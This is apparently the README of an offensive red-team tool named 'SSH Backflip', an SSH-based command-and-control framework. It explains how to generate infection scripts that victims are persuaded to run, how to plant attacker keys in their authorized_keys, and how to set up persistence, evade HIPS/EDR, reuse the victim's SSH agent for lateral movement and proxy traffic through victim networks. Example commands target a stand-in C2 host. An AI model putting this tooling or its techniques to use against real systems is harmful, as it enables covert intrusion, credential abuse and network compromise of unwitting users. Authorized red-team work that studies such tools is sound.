# The SSH Backflip <br>
<br>
The SSH Backflip is a convenient mechanism for Command and Control based on SSH and offering features such as:<br>
* Living Of the Land <br>
* Accepted in more places than even mastercard <br>
* Strong traffic encryption <br>
* Key based authentication <br>
* CLI access <br>
* File transfers <br>
* SOCKS proxy <br>
* SSH agent reuse (as in, "reuse the victim's ssh agent for lateral movement") <br>


## WTF <br>
What we call an SSH Backflip is nothing more than some clever use of SSH.<br>
We start by establishing an outbound SSH connection from the victim to our C2 server. This outbound conection establishes an "ssh tunnel" configured to forward a port from the victim host back to the C2 server. To prevent the connecting victim from running commands on the C2 server we use a carefully crafted systemd configuration to sandbox the C2 instance of sshd. Additionally, the "flip" user is configured without a shell.<br> We do a port forward of TCP/22 (ssh) from the victim to TCP/400x on the C2 server. For each new victim we assign a new port, for example 4001, 4002, 4003, etc. This allows us to expose multiple victims' SSH endpoints on the C2 server side.<br>

Authentication is key-based and we allocate a unique set of keys per victim. Each set of (public-private) keys serve dual purpose: they allow us to authenticate the victim's connection to the C2 server and at the same time allow us to login on the victim system.<br>

To run commands on the victim workstation we simply start an SSH session on the C2 server connecting to the local port assigned to the desired victim.<br>

Outbound SSH connections are usually whitelisted by corporate firewalls. Also, they draw less attention than inbound SSH connections. Because we are connecting to the victim's SSH port through the tunnel, our connection into the victim will appear to come from the victim itself (127.0.0.1) and likely be ignored by HIPS and EDR.<br>


## Components

To use the SSH backflips you'll need:
* SSH server for backflips (with the right configurations).
* User to associate with and authenticate incoming backlfips connections. We like to name it "**flip**".
* Python scripts to manage backflips and generate "backflip payloads" used to infect victims.
* Payload templates for the different systems you want to backflip, we include linux (python 2 and 3), macos (bash) and windows (powershell)
* Configuration file "etc/backflips.conf" which stores parameters needed by the above mentioned Python scripts.
* SSH config file "etc/backflips_db" that serves as a database for storing backflip connections.



### etc/backflips.conf
This stores the basic configurations for generating new backflips. The default configuration looks as follows:<br>
```
[DEFAULT]
backflipServer = redteamexample.com
backflipPort = 2222
backflipUser = flip
backflipPath = /opt/backflips/
```

At a minimum you should customize the "backflipServer" with the FQDN you want to use for C2. <br>
The "backflipPath" is the base location on the server's filesystem where you have installed the SSH backflip files.

### sshbackflip.py
#### The "new" command
The sshbackflip python script is used to setup a **new** backflip, meaning: create a new set of keys, designate a port on the C2 server to map the SSH port forwarded by the victim, and output a script (one-liner when possible) that you can run on the victim host to infect them.The infection process should install the backflip (taking care of dropping ssh keys, starting the connection and setting up a persistence mechanism).<br> It supports outputing scripts for: linux (python2 and python3), macos and windows.<br>
Example usage:<br>
`python3 sshbackflip.py new -b redteamexample.com -p 4001 -u johndoe -t victimcomputer1 -o linux`<br><br>
This command will setup a new backflip and output a script to target the user "johndoe" on the host "victimcomputer1". It's up to you to convince "John" to run the script. When "johndoe" executes the script on their host it will do an SSH backlfip, connecting back to our C2 server "redteamexample.com" and port forwarding it's port 22 to our port 4001.<br>
* You can actually omit the -b and the script will use the default FQDN you defined in backflips.conf.<br>
* You can also omit -u if you don't know the victim's username ahead of time and the script will use a random word. See "the faceplant" bellow.<br>
* You can omit -p as well and let the script select the first available port in the range of 4001-4999.<br>

sshbackflip.py will save the set of keys for this backflip instance in the `keys/` directory (under the backflips base directory).<br>
Aditionally it will save a copy of the infection script in the `payloads/` directory.<br><br>
#### The "faceplant"
You need to know the username that ran the payload and got infected. The reason is that our malicious SSH keys got added to their SSH "authorized_keys" file and when we connect to their host to get a shell we will login to their account. So what happens if you didn't know the username in advance and you didn't specify it when you setup the new backflip? Don't worry, the first time the payload executes on the victim host it leak the data to us. This is achieved by making an SSH connection attempt from the victim to the C2 server with the victim's username and a random locator word. The connection will fail due to "incorrect username" and we'll see this in our C2 SSH server logs. We affectionately call this a "faceplant".<br>
You can check the logs to find faceplant like this:<br>
`sudo journalctl -S -u ssh-backflips |grep -i "<random locator word>"`<br>
Once you know the correct username of the victim you can update the User data in `etc/backflips_db`. (We should probably automate this, there's an opportunit for you to contribute some code to the project). <br><br>
#### The "connect" command
If the victim succesfuly ran the infection script and are currently connected to the C2 server, you can SSH to their computer and get a shell with the "connect" command and indicating the "target" hostname.<br>
Example usage:<br>
`python3 sshbacklfip.py connect -t vicitmcomputer`<br><br>

#### The "list" command
If you forgot the "target name" of the victim computer you can use the list command to get a listing of all the backflips contained in `etc/backflips_db`.<br>
Example usage:<br>
`python3 sshbackflip.py list`<br><br>

#### The "delete" command
If you wish to delete a victim host record from `etc/backflips_db` you can use the included "delete" command. This will not delete the keys from `etc/keys`.<br>
Example usage:<br>
`python3 sshbackflip.py delete -t victimcomputer`<br><br><br>

#### The "socks" command
Manages the SOCKS proxy over backflip, which allows you, the attacker, to proxy traffic through the victim's computer into whatever network they're connected to. <br>
The subcommand --enable enables the SOCKS proxy by making an SSH connection to the victim's computer with the -D flag. This connection is kept alive by a little service which employs autossh. The service is configured and managed as a systemd unit. <br>
The subcommand --disable stops the SOCS proxy for the backflip instance you select and removed the systemd service unit file.<br><br><br>

### Templates and stuff
The "payloads" generated by `sshbackflip.py` are based on templates (jinja2) you can find under `sshbackflip/linux` or `sshbackflip/macos` or `sshbackflip/windows` depending on the OS they target.<br>
If you want to adjust their behavior or add new go ahead and play with the templates over there.<br>
You'll notice that the **windows** subfolder includes a copy of win32-openssh for use in case the victim windows host doesn't already have OpenSSH installed. We grabbed it from here: https://github.com/PowerShell/Win32-OpenSSH/releases. If you want you can modify the template to download the latest release from github directly on the victim host.<br>


## Things to Note

* Port numbers for socks proxies will need to be managed out of band. Implement a process and use it.<br>
* You are running an additional ssh server that your victims ssh to. This can be abused by somebody who has control of the victim machine. While shell access is disabled, the service is sandboxed, and only port forwarding will work, one should be aware of this caveat.<br>
